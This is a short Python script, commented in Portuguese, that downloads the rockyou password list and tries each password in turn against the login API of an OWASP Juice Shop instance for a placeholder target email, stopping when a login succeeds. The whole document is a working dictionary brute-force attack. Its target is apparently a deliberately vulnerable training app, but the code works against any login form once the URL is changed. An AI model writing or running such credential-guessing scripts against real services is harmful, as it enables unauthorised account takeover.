import requests
import os

ROCKYOU_FILE_PATH = 'rockyou.txt'

# Só baixa o arquivo de senhas se ele ainda não existir no disco
if not os.path.exists(ROCKYOU_FILE_PATH):
  rockyou_response = requests.get('https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt')
  
  with open(ROCKYOU_FILE_PATH, 'w', encoding='utf-8') as rockyoufile:
    rockyoufile.write(rockyou_response.text)

with open(ROCKYOU_FILE_PATH, encoding='utf-8') as rockyoufile:
  email = 'e-mail@do.alvo'
  
  # Para cada senha no arquivo, tenta fazer o login
  for senha in rockyoufile:
    senha = senha.replace('\n', '')
    payload = {"email": email, "password": senha}

    response = requests.post('https://juice-shop.herokuapp.com/rest/user/login', json=payload)
    
    if response.status_code == 200:
      print(senha, 'Login com sucesso!')
      break
    else:
      print(senha, 'Falha no login')